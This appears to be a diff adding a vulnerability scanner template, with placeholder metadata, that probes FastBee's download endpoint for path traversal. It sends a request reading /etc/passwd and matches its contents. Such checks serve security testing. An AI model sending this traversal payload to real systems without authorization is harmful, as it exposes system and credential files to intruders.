@@ -1,0 +1,20 @@
+id: FastBee-download-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
